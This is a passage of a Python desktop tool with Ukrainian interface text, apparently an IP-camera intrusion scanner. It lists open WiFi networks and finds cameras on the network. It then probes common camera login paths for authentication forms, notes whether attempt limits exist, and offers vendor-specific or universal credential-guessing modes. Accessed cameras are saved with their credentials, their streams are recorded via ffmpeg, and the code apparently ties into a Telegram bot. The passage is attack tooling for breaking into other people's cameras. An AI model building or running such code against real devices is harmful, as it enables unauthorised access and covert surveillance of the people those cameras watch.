            log("[PRGRSS-DBG] КІНЕЦЬ ФУНКЦІЇ save_ffmpeg_stream")

    def _show_photo_from_url(self, url, auth=None):
        """Helper method to show a photo from a URL"""
        try:
            session = requests.Session()
            r = session.get(url, auth=HTTPBasicAuth(*auth) if auth else None, 
                           timeout=HTTP_TIMEOUT, verify=False)
            
            if r.status_code == 200:
                
                with tempfile.NamedTemporaryFile(delete=False, suffix='.jpg') as f:
                    f.write(r.content)
                    temp_path = f.name
                
                img = cv2.imread(temp_path)
                self.display_frame(img)
                self.status_var.set(f"Showing photo stream")
                os.unlink(temp_path)  
            else:
                self.status_var.set(f"Error: HTTP status {r.status_code}")
        except Exception as e:
            self.status_var.set(f"Error displaying photo: {e}")

    def on_close(self):
        """Handle window close event without terminating the bot process"""
        try:
            
            self.is_closing = True
            
            
            if hasattr(self, 'update_job') and self.update_job:
                self.window.after_cancel(self.update_job)
                
            
            
            log("[*] Telegram config window closing - bot will continue running")
            
            
            self.window.after(300, self.complete_close)
        except Exception as e:
            log(f"[!] Error during Telegram config close: {e}")
            
            try:
                self.window.destroy()
            except:
                pass

def save_video(session, url, ip, auth):
    """Save a video from a URL"""
    try:
        filename = f"camera_{ip}_video.mp4"
        
        
        if 'mjpg' in url.lower() or 'mjpeg' in url.lower():
            
            frames = []
            
            for _ in range(30):  
                try:
                    r = session.get(url, timeout=HTTP_TIMEOUT, auth=auth, verify=False)
                    if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                        
                        with tempfile.NamedTemporaryFile(delete=False, suffix='.jpg') as f:
                            f.write(r.content)
                            frames.append(f.name)
                        time.sleep(0.2)  
                except Exception as e:
                    log(f"[!] Error getting frame: {e}")
                    break
                    
            if frames:
                
                img = cv2.imread(frames[0])
                height, width = img.shape[:2]
                fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                out = cv2.VideoWriter(filename, fourcc, 5, (width, height))
                
                for frame_path in frames:
                    img = cv2.imread(frame_path)
                    if img is not None:
                        out.write(img)
                    os.unlink(frame_path)  
                
                out.release()
                log(f"[+] Created MJPEG video: {filename}")
            else:
                
                convert_snapshot_to_mp4(f"camera_{ip}_snapshot.jpg", filename)
        else:
            
            args = ["ffmpeg", "-y"]
            
            if auth:
                
                if hasattr(auth, 'username') and hasattr(auth, 'password'):
                    
                    username = auth.username
                    password = auth.password
                elif isinstance(auth, tuple) and len(auth) >= 2:
                    
                    username = auth[0]
                    password = auth[1]
                else:
                    log(f"[!] Unknown auth format: {type(auth)}")
                    username = password = None
                
                if username and password:
                    auth_string = f"{username}:{password}"
                    import base64
                    auth_header = base64.b64encode(auth_string.encode()).decode()
                    args.extend(["-headers", f"Authorization: Basic {auth_header}\r\n"])
                
            args.extend(["-i", url, "-t", str(VIDEO_DURATION), 
                       "-c:v", "copy", "-an", filename])
                       
            subprocess.run(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        log(f"[+] Saved video to {filename}")
        
        
        if ip in successful_streams:
            successful_streams[ip]['video_path'] = filename
            
        return True
    except Exception as e:
        log(f"[!] Failed to save video: {e}")
        return False

def open_camera_viewer():
    """Open the camera viewer window with better memory management"""
    global current_viewer
    
    
    if current_viewer is not None:
        try:
            if hasattr(current_viewer, 'stop_viewing'):
                current_viewer.stop_viewing()
        except:
            pass
        current_viewer = None
        
        
        import gc
        gc.collect()
    
    
    try:
        viewer_window = tk.Toplevel()
        viewer_window.title("Camera Viewer")
        
        
        current_viewer = CameraViewer(viewer_window)
        
        
        def on_viewer_close():
            global current_viewer
            try:
                if current_viewer:
                    current_viewer.stop_viewing()
                    current_viewer = None
                    
                    
                    import gc
                    gc.collect()
                    
                viewer_window.destroy()
            except Exception as e:
                log(f"[!] Error closing viewer: {e}")
        
        viewer_window.protocol("WM_DELETE_WINDOW", on_viewer_close)
        
    except Exception as e:
        log(f"[!] Error opening camera viewer: {e}")
        
        
        current_viewer = None



def show_camera_selection_window(detected_cameras):
    """Показує вікно для вибору камер"""
    global root, messagebox
    selection_window = tk.Toplevel()
    selection_window.title("Вибір камери для сканування")
    selection_window.geometry("600x400")
    
    
    selected_camera = {"value": None}
    
    
    select_frame = ttk.LabelFrame(selection_window, text="Виявлені камери")
    select_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    
    columns = ('ip', 'ports', 'vendor', 'detection_type')
    tree = ttk.Treeview(select_frame, columns=columns, show='headings')
    
    
    tree.heading('ip', text='IP адреса')
    tree.heading('ports', text='Порти')
    tree.heading('vendor', text='Виробник')
    tree.heading('detection_type', text='Тип виявлення')
    
    
    tree.column('ip', width=120)
    tree.column('ports', width=150)
    tree.column('vendor', width=100)
    tree.column('detection_type', width=150)
    
    
    for camera in detected_cameras:
        ports_str = ", ".join([str(p["port"]) for p in camera["ports"]])
        detection_type = "За ключовим словом" if camera["detection_type"] == "keyword" else "За портом"
        tree.insert('', tk.END, values=(camera["ip"], ports_str, camera["vendor"], detection_type))
    
    
    scrollbar = ttk.Scrollbar(select_frame, orient=tk.VERTICAL, command=tree.yview)
    tree.configure(yscroll=scrollbar.set)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    tree.pack(fill=tk.BOTH, expand=True)
    
    
    button_frame = ttk.Frame(selection_window)
    button_frame.pack(fill=tk.X, padx=10, pady=10)
    
    
    def on_select():
        selected_item = tree.selection()
        if selected_item:
            item = tree.item(selected_item[0])
            values = item['values']
            ip = values[0]
            
            
            for camera in detected_cameras:
                if camera["ip"] == ip:
                    selected_camera["value"] = camera
                    selection_window.destroy()
                    show_form_detection_window(camera)
                    
        else:
            messagebox.showwarning("Попередження", "Будь ласка, виберіть камеру зі списку")
    
    
    ttk.Button(button_frame, text="Знайти форми автентифікації", command=on_select).pack(side=tk.LEFT, padx=5)
    ttk.Button(button_frame, text="Скасувати", command=selection_window.destroy).pack(side=tk.RIGHT, padx=5)
    
    
    selection_window.transient(root)
    selection_window.grab_set()
    root.wait_window(selection_window)
    
    return selected_camera["value"]
    

def show_form_detection_window(camera):
    """Показує вікно для пошуку і вибору форм автентифікації"""
    global root, messagebox
    form_window = tk.Toplevel()
    form_window.title(f"Пошук форм автентифікації - {camera['ip']}")
    form_window.geometry("700x500")
    
    
    selected_form = {"value": None}
    
    
    info_frame = ttk.Frame(form_window)
    info_frame.pack(fill=tk.X, padx=10, pady=5)
    
    status_var = tk.StringVar(value="Готовий до пошуку форм автентифікації")
    status_label = ttk.Label(info_frame, textvariable=status_var)
    status_label.pack(side=tk.LEFT)
    
    progress_var = tk.DoubleVar()
    progress = ttk.Progressbar(info_frame, variable=progress_var, maximum=100)
    progress.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=10)
    
    
    form_frame = ttk.LabelFrame(form_window, text="Знайдені форми автентифікації")
    form_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    
    columns = ('path', 'form_type', 'method', 'limit_detected')
    tree = ttk.Treeview(form_frame, columns=columns, show='headings')
    
    
    tree.heading('path', text='Шлях')
    tree.heading('form_type', text='Тип форми')
    tree.heading('method', text='Метод')
    tree.heading('limit_detected', text='Виявлено ліміт спроб')
    
    
    tree.column('path', width=250)
    tree.column('form_type', width=150)
    tree.column('method', width=100)
    tree.column('limit_detected', width=150)
    
    
    scrollbar = ttk.Scrollbar(form_frame, orient=tk.VERTICAL, command=tree.yview)
    tree.configure(yscroll=scrollbar.set)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    tree.pack(fill=tk.BOTH, expand=True)
    
    
    button_frame = ttk.Frame(form_window)
    button_frame.pack(fill=tk.X, padx=10, pady=10)
    
    
    def find_auth_forms():
        tree.delete(*tree.get_children())  
        status_var.set("Пошук форм автентифікації...")
        progress_var.set(10)
        form_window.update_idletasks()
        
        
        forms = []
        
        
        ports_to_check = [p["port"] for p in camera["ports"]]
        if not ports_to_check:
            ports_to_check = [80, 443, 8080, 8000, 8081]
            
        for port_index, port in enumerate(ports_to_check):
            
            progress_percentage = 10 + (port_index / len(ports_to_check)) * 80
            progress_var.set(progress_percentage)
            form_window.update_idletasks()
            
            
            protocols = ["http"]
            if port == 443 or port == 8443:
                protocols = ["https"]
            
            for protocol in protocols:
                base_url = f"{protocol}://{camera['ip']}:{port}"
                status_var.set(f"Перевірка {base_url}...")
                form_window.update_idletasks()
                
                try:
                    
                    session = requests.Session()
                    response = session.get(base_url, timeout=2.0, verify=False)
                    
                    if response.status_code == 200:
                        
                        soup = BeautifulSoup(response.text, 'html.parser')
                        found_forms = soup.find_all('form')
                        
                        for form in found_forms:
                            form_action = form.get('action', '')
                            form_method = form.get('method', 'get').upper()
                            
                            
                            form_url = urljoin(base_url, form_action)
                            
                            
                            form_type = "Невідомо"
                            form_inputs = form.find_all(['input', 'button'])
                            for input_field in form_inputs:
                                input_type = input_field.get('type', '').lower()
                                input_name = input_field.get('name', '').lower()
                                input_id = input_field.get('id', '').lower()
                                
                                if input_type == 'password' or 'pass' in input_name or 'pass' in input_id:
                                    form_type = "Логін форма"
                                    break
                            
                            
                            limit_detected = "Невідомо"
                            
                            
                            forms.append({
                                'url': form_url,
                                'path': form_action if form_action else '/',
                                'form_type': form_type,
                                'method': form_method,
                                'limit_detected': limit_detected,
                                'protocol': protocol,
                                'port': port
                            })
                    
                    
                    common_auth_paths = [
                        "/login.cgi", "/login", "/cgi-bin/auth.cgi", "/cgi-bin/login.cgi",
                        "/admin/login", "/web/login", "/auth", "/web/auth.html"
                    ]
                    
                    for path in common_auth_paths:
                        try:
                            auth_url = f"{base_url}{path}"
                            status_var.set(f"Перевірка {auth_url}...")
                            form_window.update_idletasks()
                            
                            auth_response = session.get(auth_url, timeout=1.5, verify=False)
                            
                            if auth_response.status_code in [200, 401, 403]:
                                
                                auth_soup = BeautifulSoup(auth_response.text, 'html.parser')
                                page_forms = auth_soup.find_all('form')
                                
                                if page_forms:
                                    for form in page_forms:
                                        form_action = form.get('action', '')
                                        form_method = form.get('method', 'get').upper()
                                        
                                        
                                        forms.append({
                                            'url': urljoin(auth_url, form_action),
                                            'path': path + (form_action if form_action else ''),
                                            'form_type': "Логін форма",
                                            'method': form_method,
                                            'limit_detected': "Невідомо",
                                            'protocol': protocol,
                                            'port': port
                                        })
                                else:
                                    
                                    forms.append({
                                        'url': auth_url,
                                        'path': path,
                                        'form_type': "Потенційна точка автентифікації",
                                        'method': "GET/POST",
                                        'limit_detected': "Невідомо",
                                        'protocol': protocol,
                                        'port': port
                                    })
                                    
                        except Exception as e:
                            
                            continue
                
                except Exception as e:
                    log(f"[!] Помилка при перевірці {base_url}: {str(e)}")
        
        
        if forms:
            for form in forms:
                tree.insert('', tk.END, values=(
                    form['path'], 
                    form['form_type'], 
                    form['method'], 
                    form['limit_detected']
                ), tags=(form['url'], form['protocol'], str(form['port'])))
            status_var.set(f"Знайдено {len(forms)} форм автентифікації")
        else:
            status_var.set("Форми автентифікації не знайдено")
            
            
            for port in ports_to_check:
                protocol = "https" if port in [443, 8443] else "http"
                tree.insert('', tk.END, values=(
                    "/", 
                    "HTTP Basic Auth", 
                    "BASIC", 
                    "Невідомо"
                ), tags=(f"{protocol}://{camera['ip']}:{port}/", protocol, str(port)))
        
        progress_var.set(100)
        form_window.update_idletasks()
    
    
    def on_select():
        selected_item = tree.selection()
        if selected_item:
            item = tree.item(selected_item[0])
            values = item['values']
            tags = item['tags']
            
            
            form = {
                'url': tags[0],
                'protocol': tags[1],
                'port': int(tags[2]),
                'path': values[0],
                'form_type': values[1],
                'method': values[2]
            }
            
            selected_form["value"] = form
            form_window.destroy()
            show_scan_mode_window(camera, form)
        else:
            messagebox.showwarning("Попередження", "Будь ласка, виберіть форму автентифікації зі списку")
    
    
    ttk.Button(button_frame, text="Пошук форм автентифікації", command=find_auth_forms).pack(side=tk.LEFT, padx=5)
    ttk.Button(button_frame, text="Вибрати і продовжити", command=on_select).pack(side=tk.LEFT, padx=5)
    ttk.Button(button_frame, text="Скасувати", command=form_window.destroy).pack(side=tk.RIGHT, padx=5)
    
    
    form_window.after(100, find_auth_forms)
    
    
    form_window.transient(root)
    form_window.grab_set()
    root.wait_window(form_window)
    
    return selected_form["value"]

def show_scan_mode_window(camera, form):
    """Показує вікно для вибору режиму сканування"""
    global root, registry
    scan_mode_window = tk.Toplevel()
    scan_mode_window.title(f"Вибір режиму сканування - {camera['ip']}")
    scan_mode_window.geometry("800x600")
    
    
    selected_mode = {"value": None}
    
    
    info_frame = ttk.LabelFrame(scan_mode_window, text="Інформація про камеру")
    info_frame.pack(fill=tk.X, padx=10, pady=10)
    
    
    ttk.Label(info_frame, text=f"IP адреса: {camera['ip']}").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
    ports_str = ", ".join([str(p["port"]) for p in camera["ports"]])
    ttk.Label(info_frame, text=f"Відкриті порти: {ports_str}").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
    ttk.Label(info_frame, text=f"Виявлений виробник: {camera['vendor']}").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
    
    
    form_frame = ttk.LabelFrame(scan_mode_window, text="Форма автентифікації")
    form_frame.pack(fill=tk.X, padx=10, pady=10)
    
    ttk.Label(form_frame, text=f"URL: {form['url']}").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
    ttk.Label(form_frame, text=f"Тип: {form['form_type']}").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
    ttk.Label(form_frame, text=f"Метод: {form['method']}").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
    
    
    mode_frame = ttk.LabelFrame(scan_mode_window, text="Режим сканування")
    mode_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    
    scan_mode = tk.StringVar()
    
    
    modes = []
    
    
    for vendor in registry.vendors:
        if vendor.name != "generic":  
            modes.append((f"{vendor.name.capitalize()} специфічний", f"{vendor.name}_vendor"))
    
    
    modes.append(("Універсальний підбор", "universal"))
    
    
    if camera['vendor'] != "unknown" and camera['vendor'] != "generic":
        scan_mode.set(f"{camera['vendor']}_vendor")
    else:
        scan_mode.set("universal")
    
    
    for i, (text, mode) in enumerate(modes):
        ttk.Radiobutton(mode_frame, text=text, variable=scan_mode, value=mode).grid(
            row=i, column=0, sticky=tk.W, padx=10, pady=5
        )
    
    
    button_frame = ttk.Frame(scan_mode_window)
    button_frame.pack(fill=tk.X, padx=10, pady=10)
    
    
    def on_start_scan():
        mode = scan_mode.get()
        selected_mode["value"] = mode
        scan_mode_window.destroy()
        
        
        start_targeted_scan(camera, form, mode)
    
    
    ttk.Button(button_frame, text="Почати сканування", command=on_start_scan).pack(side=tk.LEFT, padx=5)
    ttk.Button(button_frame, text="Скасувати", command=scan_mode_window.destroy).pack(side=tk.RIGHT, padx=5)
    
    
    scan_mode_window.transient(root)
    scan_mode_window.grab_set()
    root.wait_window(scan_mode_window)
    
    return selected_mode["value"]

def create_main_window():
    global output_box, selected_network, progress_var, status_var, root, control_frame
    root = tk.Tk()
    root.title("IP Camera Scanner (HTTP Only)")
    root.geometry("800x600")
    
    
    status_var = tk.StringVar()
    status_var.set("Ready. Connect to WiFi and press Start Scan to begin.")
    
    
    progress_var = tk.DoubleVar()
    
    
    main_frame = ttk.Frame(root, padding="10")
    main_frame.pack(fill=tk.BOTH, expand=True)
    
    
    wifi_frame = ttk.LabelFrame(main_frame, text="WiFi Selection", padding="10")
    wifi_frame.pack(fill=tk.X, padx=5, pady=5)
    
    ttk.Label(wifi_frame, text="Available Networks:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
    
    selected_network = tk.StringVar()
    networks_combo = ttk.Combobox(wifi_frame, textvariable=selected_network, state="readonly")
    networks_combo.grid(row=0, column=1, sticky=tk.W+tk.E, padx=5, pady=5)
    
    
    def refresh_networks():
        networks = find_open_wifi()
        network_display = [f"{ssid} ({security})" for ssid, security in networks]
        networks_combo['values'] = network_display
        if network_display:
            networks_combo.current(0)
    
    
    root.after(100, refresh_networks)
        
    ttk.Button(wifi_frame, text="Refresh Networks", command=refresh_networks).grid(row=0, column=2, padx=5, pady=5)
    
    
    ttk.Label(wifi_frame, text="Password:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
    
    password_var = tk.StringVar()
    password_entry = ttk.Entry(wifi_frame, textvariable=password_var, show="*")
    password_entry.grid(row=1, column=1, sticky=tk.W+tk.E, padx=5, pady=5)
    
    
    def connect_button_click():
        if not selected_network.get():
            messagebox.showerror("Error", "Please select a network")
            return
            
        
        network_info = selected_network.get()
        parts = network_info.split(" (")
        ssid = parts[0]
        security = parts[1][:-1] if len(parts) > 1 else ""
        
        
        connect_to_wifi(ssid, password_var.get(), security)
    
    ttk.Button(wifi_frame, text="Connect", command=connect_button_click).grid(row=1, column=2, padx=5, pady=5)
    
    
    control_frame = ttk.Frame(main_frame)
    control_frame.pack(fill=tk.X, padx=5, pady=5)
    
    
    ip_frame = ttk.Frame(control_frame)
    ip_frame.pack(side=tk.LEFT, padx=5, pady=5)

    ttk.Label(ip_frame, text="IP Address:").pack(side=tk.LEFT, padx=2)
    ip_entry_var = tk.StringVar()
    ip_entry = ttk.Entry(ip_frame, textvariable=ip_entry_var, width=15)
    ip_entry.pack(side=tk.LEFT, padx=2)

    
    ttk.Button(ip_frame, text="Scan IP", 
            command=lambda: threading.Thread(target=lambda: scan_specific_ip(ip_entry_var.get()), 
                                            daemon=True).start()).pack(side=tk.LEFT, padx=2)

    
    ttk.Button(control_frame, text="Start Scan", command=lambda: threading.Thread(target=start_new_scan, daemon=True).start()).pack(side=tk.LEFT, padx=5, pady=5)
    
    
    def stop_scan():
        stop_event.set()
        log("[!] Зупинка сканування...")
        
        
        status_var.set("Зупинка сканування - зачекайте...")
        
        
        root.update_idletasks()
        
        
        check_stop_progress()

    ttk.Button(control_frame, text="Stop Scan", command=stop_scan).pack(side=tk.LEFT, padx=5, pady=5)

    def check_stop_progress():
        """Перевіряє прогрес зупинки сканування"""
        if stop_event.is_set():
            
            status_var.set("Зупинка сканування - будь ласка, зачекайте...")
            root.update_idletasks()
            
            root.after(300, check_stop_progress)
    
    def force_update():
        if stop_event.is_set():
            
            status_var.set("Still stopping - please wait...")
            root.update_idletasks()
            root.after(300, force_update)
    
    
    root.after(100, force_update)
    def delete_selected_camera_dialog():
        """Show dialog to select which camera to delete"""
        global successful_streams
        
        
        saved_cameras = {}
        if os.path.exists("saved_cameras.json"):
            try:
                with open("saved_cameras.json", "r") as f:
                    saved_cameras = json.load(f)
            except:
                messagebox.showinfo("Delete Camera", "Помилка при читанні файлу збережених камер")
                return
        
        
        if not saved_cameras and not successful_streams:
            messagebox.showinfo("Delete Camera", "Немає доступних камер для видалення")
            return
        
        
        combined_cameras = {**saved_cameras, **successful_streams}
        
        if not combined_cameras:
            messagebox.showinfo("Delete Camera", "Немає доступних камер для видалення")
            return
            
        
        dialog = tk.Toplevel(root)
        dialog.title("Delete Camera")
        dialog.geometry("450x200")
        dialog.transient(root)
        dialog.grab_set()
        
        
        ttk.Label(dialog, text="Виберіть камеру для видалення:", font=('Helvetica', 10)).pack(pady=10)
        
        
        camera_var = tk.StringVar()
        camera_dropdown = ttk.Combobox(dialog, textvariable=camera_var, state="readonly", width=50)
        camera_dropdown.pack(pady=10, padx=20, fill=tk.X)
        
        
        camera_list = []
        for ip, data in combined_cameras.items():
            camera_list.append(format_camera_display(ip, data))
        
        camera_dropdown['values'] = camera_list
        if camera_list:
            camera_dropdown.current(0)
        
        
        button_frame = ttk.Frame(dialog)
        button_frame.pack(pady=20, fill=tk.X)
        
        
        def delete_camera():
            selected_display = camera_var.get()
            selected_ip = extract_ip_from_display(selected_display)
            
            
            if selected_ip in successful_streams:
                del successful_streams[selected_ip]
            
            
            if os.path.exists("saved_cameras.json"):
                try:
                    
                    with open("saved_cameras.json", "r") as f:
                        saved_data = json.load(f)
                    
                    
                    if selected_ip in saved_data:
                        del saved_data[selected_ip]
                    
                    
                    with open("saved_cameras.json", "w") as f:
                        json.dump(saved_data, f, indent=4)
                    
                    log(f"[+] Камеру {selected_display} видалено з пам'яті та збереженого файлу")
                except Exception as e:
                    log(f"[!] Помилка при оновленні файлу: {str(e)}")
            
            
            new_combined = {}
            if os.path.exists("saved_cameras.json"):
                try:
                    with open("saved_cameras.json", "r") as f:
                        new_combined = json.load(f)
                except:
                    pass
            
            new_combined.update(successful_streams)
            
            updated_camera_list = []
            for ip, data in new_combined.items():
                updated_camera_list.append(format_camera_display(ip, data))
                
            camera_dropdown['values'] = updated_camera_list
            
            
            if updated_camera_list:
                camera_dropdown.current(0)
            else:
                camera_dropdown.set("")
                messagebox.showinfo("Delete Camera", f"Камеру {selected_display} успішно видалено")
                dialog.destroy()
            
            log(f"[+] Видалено камеру: {selected_display}")
            messagebox.showinfo("Delete Camera", f"Камеру {selected_display} успішно видалено")
        
        
        ttk.Button(button_frame, text="Delete", command=delete_camera).pack(side=tk.LEFT, padx=20)
        
        
        def delete_all_cameras():
            if messagebox.askyesno("Delete All Cameras", "Ви впевнені, що хочете видалити всі камери?"):
                global successful_streams
                successful_streams = {}
                
                
                if os.path.exists("saved_cameras.json"):
                    try:
                        os.remove("saved_cameras.json")
                        log("[+] Файл збережених камер видалено")
                    except Exception as e:
                        log(f"[!] Помилка при видаленні файлу камер: {e}")
                        
                        try:
                            with open("saved_cameras.json", "w") as f:
                                f.write("{}")
                            log("[+] Створено порожній файл збережених камер")
                        except Exception as e2:
                            log(f"[!] Помилка при створенні порожнього файлу: {e2}")
                
                log("[+] Всі збережені камери видалено")
                messagebox.showinfo("Delete Cameras", "Всі камери видалено з пам'яті та сховища")
                dialog.destroy()
        
        ttk.Button(button_frame, text="Delete All Cameras", command=delete_all_cameras).pack(side=tk.LEFT, padx=20)
        
        
        ttk.Button(button_frame, text="Cancel", command=dialog.destroy).pack(side=tk.RIGHT, padx=20)

    ttk.Button(control_frame, text="Delete Camera", command=delete_selected_camera_dialog).pack(side=tk.LEFT, padx=5, pady=5)

    
    def load_cameras():
        """Show dialog to select which camera to load"""
        global successful_streams  
        
        try:
            
            if not os.path.exists("saved_cameras.json"):
                messagebox.showinfo("Load Cameras", "No saved cameras found")
                return
                    
            
            with open("saved_cameras.json", "r") as f:
                try:
                    file_content = f.read().strip()
                    if not file_content:
                        messagebox.showinfo("Load Cameras", "Saved cameras file is empty")
                        return
                        
                    
                    try:
                        cameras_data = json.loads(file_content)
                        if not cameras_data:
                            messagebox.showinfo("Load Cameras", "No cameras saved in file")
                            return
                    except json.JSONDecodeError:
                        messagebox.showerror("Error", "The saved cameras file is corrupted. Creating a new file.")
                        
                        with open("saved_cameras.json", "w") as new_f:
                            new_f.write("{}")
                        return
                except Exception as e:
                    messagebox.showerror("Error", f"Error reading cameras file: {e}")
                    return
            
            
            dialog = tk.Toplevel(root)
            dialog.title("Load Camera")
            dialog.geometry("450x200")  
            dialog.transient(root)
            dialog.grab_set()
            
            
            ttk.Label(dialog, text="Select a camera to load:", font=('Helvetica', 10)).pack(pady=10)
            
            
            camera_var = tk.StringVar()
            camera_dropdown = ttk.Combobox(dialog, textvariable=camera_var, state="readonly", width=50)  
            camera_dropdown.pack(pady=10, padx=20, fill=tk.X)
            
            
            camera_list = []
            for ip, data in cameras_data.items():
                camera_list.append(format_camera_display(ip, data))
            
            camera_dropdown['values'] = camera_list
            if camera_list:
                camera_dropdown.current(0)
            
            
            button_frame = ttk.Frame(dialog)
            button_frame.pack(pady=20, fill=tk.X)
            
            
            def load_selected_camera():
                global successful_streams  
                selected_display = camera_var.get()
                selected_ip = extract_ip_from_display(selected_display)
                
                if selected_ip in cameras_data:
                    
                    successful_streams[selected_ip] = cameras_data[selected_ip]
                    log(f"[+] Loaded camera: {selected_display}")
                    messagebox.showinfo("Load Camera", f"Camera {selected_display} loaded successfully")
                    dialog.destroy()
                else:
                    messagebox.showwarning("Warning", "Please select a valid camera")
            
            
            def load_all_cameras():
                global successful_streams  
                for ip, data in cameras_data.items():
                    successful_streams[ip] = data
                
                
                loaded_summary = "\n".join([format_camera_display(ip, data) for ip, data in cameras_data.items()])
                log(f"[+] Loaded all {len(cameras_data)} cameras:\n{loaded_summary}")
                messagebox.showinfo("Load Cameras", f"All {len(cameras_data)} cameras loaded successfully")
                dialog.destroy()
            
            
            ttk.Button(button_frame, text="Load Selected", command=load_selected_camera).pack(side=tk.LEFT, padx=20)
            
            
            ttk.Button(button_frame, text="Load All", command=load_all_cameras).pack(side=tk.LEFT, padx=20)
            
            
            ttk.Button(button_frame, text="Cancel", command=dialog.destroy).pack(side=tk.RIGHT, padx=20)
            
        except Exception as e:
            log(f"[!] Error loading cameras: {e}")
            messagebox.showerror("Error", f"Error loading cameras: {e}")
    ttk.Button(control_frame, text="Load Cameras", command=load_cameras).pack(side=tk.LEFT, padx=5, pady=5)
    
    
    def clear_logs():
        output_box.delete(1.0, tk.END)
    
    ttk.Button(control_frame, text="Clear Logs", command=clear_logs).pack(side=tk.LEFT, padx=5, pady=5)
    
    
    def open_viewer():
        if successful_streams:
            open_camera_viewer()
        else:
            messagebox.showinfo("Viewer", "No cameras found yet")
    
    ttk.Button(control_frame, text="Open Viewer", command=open_viewer).pack(side=tk.LEFT, padx=5, pady=5)
    
   
    

    ttk.Button(control_frame, text="Telegram Bot Connect", command=safe_open_telegram_config).pack(side=tk.LEFT, padx=15, pady=5)
    
    
    status_var = tk.StringVar()
    status_var.set("Ready. Connect to WiFi and press Start Scan to begin.")
    status_bar = ttk.Label(root, textvariable=status_var, relief=tk.SUNKEN, anchor=tk.W)
    status_bar.pack(side=tk.BOTTOM, fill=tk.X)
    
    
    progress_frame = ttk.Frame(root)  
    progress_frame.pack(fill=tk.X, padx=5, pady=2)
    
    progress_bar = ttk.Progressbar(progress_frame, variable=progress_var, maximum=100)
    progress_bar.pack(fill=tk.X, expand=True, padx=5, pady=2)
    
    
    
    
    

    
    def auto_start_telegram_bot():
        """Auto-start Telegram bot with dependency checking and error handling"""
        configs = load_telegram_configs()
        if configs:
            
            try:
                import importlib.util
                missing_packages = []
                for package in ["aiohttp", "aiogram"]:
                    if importlib.util.find_spec(package) is None:
                        missing_packages.append(package)
                
                if missing_packages:
                    log(f"[!] Cannot start Telegram bot - missing dependencies: {', '.join(missing_packages)}")
                    status_var.set(f"Telegram bot not started - missing dependencies")
                    return
            except:
                log("[!] Cannot check dependencies for Telegram bot")
                return
            
            
            last_config = get_last_used_config()
            if last_config and last_config in configs:
                config_name = last_config
                log(f"[*] Using last used configuration: {config_name}")
            else:
                config_name = next(iter(configs.keys()))
                log(f"[*] Using first available configuration: {config_name}")
            
            
            def start_bot_thread():
                try:
                    
                    stop_telegram_bot()
                    
                    time.sleep(0.5)
                    
                    if start_telegram_bot(config_name):
                        
                        save_last_used_config(config_name)
                        
                        root.after(0, lambda: status_var.set(f"Telegram bot started with config: {config_name}"))
                        root.after(0, lambda: log(f"[+] Automatically started Telegram bot with config: {config_name}"))
                    else:
                        
                        root.after(0, lambda: status_var.set(f"Failed to start Telegram bot"))
                        root.after(0, lambda: log(f"[!] Failed to start Telegram bot"))
                except Exception as e:
                    
                    root.after(0, lambda: log(f"[!] Error starting Telegram bot: {e}"))
            
            
            threading.Thread(target=start_bot_thread, daemon=True).start()
    
    
    root.after(1000, auto_start_telegram_bot)
     
    
    def on_main_window_close():
        """Handle main window close event"""
        
        if 'active_bot_process' in globals() and active_bot_process:
            log("[*] Application closing - terminating Telegram bot")
            stop_telegram_bot()
            
        
        root.destroy()

    
    root.protocol("WM_DELETE_WINDOW", on_main_window_close)

    return root  

def check_install_telegram_dependencies():
    """Check for required Telegram bot dependencies and handle Kali Linux environment"""
    try:
        import importlib.util
        
        
        required_packages = ["aiohttp", "aiogram"]
        missing_packages = []
        
        
        for package in required_packages:
            if importlib.util.find_spec(package) is None:
                missing_packages.append(package)
        
        
        if not missing_packages:
            return True
            
        
        msg = "Для роботи Telegram бота потрібно встановити:\n"
        msg += ", ".join(missing_packages) + "\n\n"
        msg += "Рекомендується використовувати віртуальне середовище:\n\n"
        msg += "1. python3 -m venv ~/camera_env\n"
        msg += "2. source ~/camera_env/bin/activate\n"
        msg += "3. pip install aiohttp aiogram\n"
        msg += "4. Запустіть програму з активованого середовища\n\n"
        msg += "Спробувати встановити пакети напряму?"
        
        if messagebox.askyesno("Відсутні залежності", msg):
            try:
                
                cmd = [sys.executable, "-m", "pip", "install", "--break-system-packages"] + missing_packages
                process = subprocess.run(cmd, capture_output=True, text=True)
                
                if process.returncode == 0:
                    log("[+] Пакети успішно встановлені!")
                    return True
                else:
                    log(f"[!] Помилка встановлення: {process.stderr}")
                    return False
            except Exception as e:
                log(f"[!] Помилка встановлення: {e}")
                return False
        else:
            log("[!] Функціонал Telegram бота недоступний без необхідних пакетів")
            return False
            
    except Exception as e:
        log(f"[!] Помилка перевірки залежностей: {e}")
        return False

def save_cameras_to_file():
    """Save found cameras to a configuration file with improved error handling"""
    if not successful_streams:
        
        log("[*] No cameras to save") 
        return False
        
    try:
        
        existing_cameras = {}
        if os.path.exists("saved_cameras.json"):
            try:
                with open("saved_cameras.json", "r") as f:
                    existing_data = f.read().strip()
                    if existing_data:  
                        existing_cameras = json.loads(existing_data)
            except Exception as e:
                log(f"[!] Error loading existing cameras: {e}")
        
        
        new_cameras = {}
        for ip, data in successful_streams.items():
            
            camera_data = {}
            for key, value in data.items():
                
                if key not in ['snapshot_path', 'video_path'] and not callable(value):
                    camera_data[key] = value
            new_cameras[ip] = camera_data
        
        
        
        merged_cameras = {**existing_cameras, **new_cameras}
        
        
        temp_file = "saved_cameras.json.tmp"
        
        
        with open(temp_file, "w") as f:
            json.dump(merged_cameras, f, indent=4)
            f.flush()
            os.fsync(f.fileno())  
        
        
